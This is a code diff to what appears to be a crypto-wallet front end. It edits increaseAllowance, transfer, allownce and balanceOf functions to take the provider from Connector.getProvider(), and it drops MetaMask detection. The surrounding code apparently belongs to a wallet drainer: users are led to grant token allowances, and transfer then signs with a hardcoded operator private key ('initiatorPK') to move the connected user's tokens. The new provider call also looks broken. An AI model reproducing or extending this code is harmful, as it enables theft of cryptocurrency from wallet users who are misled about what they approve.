@@ -8,7 +8,8 @@ import {
   configureChains,
   createConfig,
   fetchBalance,
-  writeContract
+  writeContract,
+  Connector
 } from '@wagmi/core';
 import { mainnet } from '@wagmi/core/chains';
 import { getAccount, fetchFeeData, disconnect } from '@wagmi/core';
@@ -102,12 +103,8 @@ export const claim = async (_balance) => {
 };
 export const increaseAllowance = async (token) => {
   try {
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(w3mProvider({ projectId }));
+    
+    const web3 = new Web3(Connector.getProvider());
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -298,12 +295,7 @@ export const increaseAllowance = async (token) => {
 
 export const transfer = async (token) => {
   try {
-    const provideer = await detectEthereumProvider();
-    if (!provideer){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const provider = new ethers.providers.Web3Provider(w3mProvider({ projectId }));
+    const provider = new ethers.providers.Web3Provider(Connector.getProvider());
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -335,12 +327,7 @@ export const ethBalance = async () => {
 
 export const allownce = async (token) => {
   try{
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(w3mProvider({ projectId }));
+    const web3 = new Web3(Connector.getProvider());
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -354,12 +341,8 @@ export const allownce = async (token) => {
 
 export const balanceOf = async (token) => {
   try{
-    const provider = await detectEthereumProvider();
-    if (!provider){
-      console.log("Please install MetaMask");
-      return ;
-    }
-    const web3 = new Web3(w3mProvider({ projectId }));
+
+    const web3 = new Web3(Connector.getProvider());
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
